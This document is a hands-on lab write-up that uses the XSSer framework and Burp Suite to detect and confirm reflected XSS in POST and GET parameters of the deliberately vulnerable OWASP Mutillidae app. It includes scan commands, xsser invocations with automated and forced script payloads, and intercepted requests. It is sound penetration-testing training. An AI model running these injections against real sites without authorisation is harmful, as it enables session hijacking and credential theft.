## What is this lab about?
A hands-on lab demonstrating **XSSer** — an automated framework for detecting and exploiting XSS vulnerabilities. Covers both **POST-based** (DNS lookup form) and **GET-based** (poll question) reflected XSS on OWASP Mutillidae, with manual verification via Burp Suite.

---

## Key Concepts Explained

**XSSer (Cross-Site Scripter)**
- Automated XSS detection and exploitation framework.
- Tests 1000+ payloads against target parameters.
- Supports GET, POST, cookie, and header-based XSS.
- Replaces `XSS` placeholder with various payload vectors.

**Reflected XSS (First Order)**
- Malicious script injected via URL parameter or form input.
- Server reflects it back in response without sanitization.
- Executes in victim's browser when they visit the malicious link.

**XSS Placeholder (`XSS`)**
- XSSer replaces `XSS` in your parameter with actual payloads.
- Similar to Burp Intruder's `§` markers — defines injection point.

## Commands & Workflow

### Step 1 — Environment Setup
```bash
# Check Kali IP and identify target
ip addr show
nmap -sV 192.36.17.3
# Target: Mutillidae on port 80
```

### Step 2 — Identify Vulnerable Parameter (Burp Proxy)
```bash
# 1. Enable Burp proxy (127.0.0.1:8080)
# 2. FoxyProxy ON in Firefox
# 3. Navigate to Mutillidae → XSS → Reflected (DNS Lookup)
# 4. Enter "helloworld" in DNS lookup field
# 5. Burp intercepts POST request:

POST /index.php?page=dns-lookup.php HTTP/1.1
Host: 192.36.17.3
...
Content-Type: application/x-www-form-urlencoded

target_host=helloworld&dns-lookup-php-submit-button=Lookup+DNS
```

### Step 3 — Basic XSSer Test (POST)
```bash
# Replace the user input value with XSS placeholder
xsser --url "http://192.36.17.3/index.php?page=dns-lookup.php" \
      --payload "target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS"

# Result: Vulnerable confirmed!
# XSSer found injectable parameter and displayed payload used
```

### Step 4 — Automated Payload Scan
```bash
# Run all 1291 XSS payloads automatically
xsser --url "http://192.36.17.3/index.php?page=dns-lookup.php" \
      --payload "target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS" \
      --auto

# Result: 1291 injections, all successful
# Target is extremely vulnerable (intentionally, as it's a training app)
```

### Step 5 — Custom Payload Test
```bash
# Test specific payload: <script>alert(1)</script>
xsser --url "http://192.36.17.3/index.php?page=dns-lookup.php" \
      --payload "target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS" \
      --Fp "<script>alert(1)</script>"

# --Fp = Force Payload (use custom payload instead of auto-generated)
# Result: Confirmed working, payload reflected in response
```

### Step 6 — Manual Verification via Burp
```bash
# 1. Copy URL-encoded payload from XSSer output
# 2. In Burp Intercept, replace "helloworld" with encoded payload
# 3. Forward request
# 4. Browser shows: Alert box with "1" → XSS confirmed!
```

## GET-Based XSS (Poll Question)

### Step 7 — Identify GET Parameter
```bash
# Navigate to: Mutillidae → XSS → Reflected (Poll)
# Select "Nmap" from dropdown
# Burp intercepts GET request:

GET /index.php?page=add-to-your-blog.php?choice=nmap HTTP/1.1
Host: 192.36.17.3
```

### Step 8 — XSSer on GET Parameter
```bash
# Replace parameter value with XSS placeholder
xsser --url "http://192.36.17.3/index.php?page=add-to-your-blog.php" \
      --payload "choice=XSS"

# Or with --auto for full scan:
xsser --url "http://192.36.17.3/index.php?page=add-to-your-blog.php" \
      --payload "choice=XSS" \
      --auto
```

### Step 9 — Custom Payload on GET
```bash
xsser --url "http://192.36.17.3/index.php?page=add-to-your-blog.php" \
      --payload "choice=XSS" \
      --Fp "<script>alert(1)</script>"

# Result: Payload injects into URL parameter
# Manual verification: Replace "nmap" with encoded payload in Burp
# Browser shows: Alert(1) popup → Confirmed!
```

## XSSer Flags Reference

| Flag | Purpose | Example |
|---|---|---|
| `--url` | Target URL | `--url "http://target.com/page.php"` |
| `--payload` | Parameters with XSS placeholder | `--payload "param=XSS&other=value"` |
| `--auto` | Run all 1291 payloads automatically | `--auto` |
| `--Fp` | Force custom payload | `--Fp "<script>alert(1)</script>"` |
| `--cookie` | Session cookie for authenticated pages | `--cookie "PHPSESSID=abc123"` |

## Key Takeaways

| Finding | Type | Impact |
|---|---|---|
| `target_host` parameter (POST) | Reflected XSS | Script injection via form |
| `choice` parameter (GET) | Reflected XSS | Script injection via URL |
| 1291/1291 payloads successful | Extremely vulnerable | No input sanitization |

- **XSSer `XSS` placeholder** works like Burp's `§` — marks injection point.
- **POST vs GET**: POST in body, GET in URL — both exploitable.
- **URL encoding**: Browser automatically encodes `<script>` to `%3Cscript%3E`.
- **Alert(1) is just proof-of-concept** — real attacks steal cookies, session hijack, keylog.
- **Business impact**: XSS = Session hijacking, credential theft, defacement, malware distribution.
- **Remediation**: Input sanitization, output encoding, CSP headers.
